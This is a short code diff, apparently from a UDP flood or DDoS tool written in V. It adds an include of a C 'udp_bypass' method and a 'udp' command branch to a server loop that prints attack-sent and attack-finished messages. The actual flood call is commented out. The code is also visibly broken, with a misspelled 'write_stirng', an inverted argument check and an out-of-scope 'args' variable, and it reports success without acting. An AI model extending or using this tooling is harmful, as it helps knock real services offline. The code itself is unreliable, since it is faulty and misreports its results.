@@ -3,6 +3,10 @@ import io
 import net
 import time
 
+#include "@VROOT/methods/udp.c"
+
+fn C.udp_bypass(string, u16, int)
+
 fn main() {
 	mut args := os.args.clone()
 	if args.len < 4 {
@@ -34,7 +38,13 @@ fn server(ip string, port string, pw string) {
 
 		match cmd {
 			"udp" {
-
+				if args.len < 4 {
+					server.write_stirng("[ + ] Attack being sent....\n") or { 0 }
+					// C.udp_bypass(args[1], args[2], args[3])
+					server.write_stirng("[ + ] Attack Successfully finished....\n") or { 0 }
+				} else {
+					server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
+				}
 			} else {}
 		}
 		
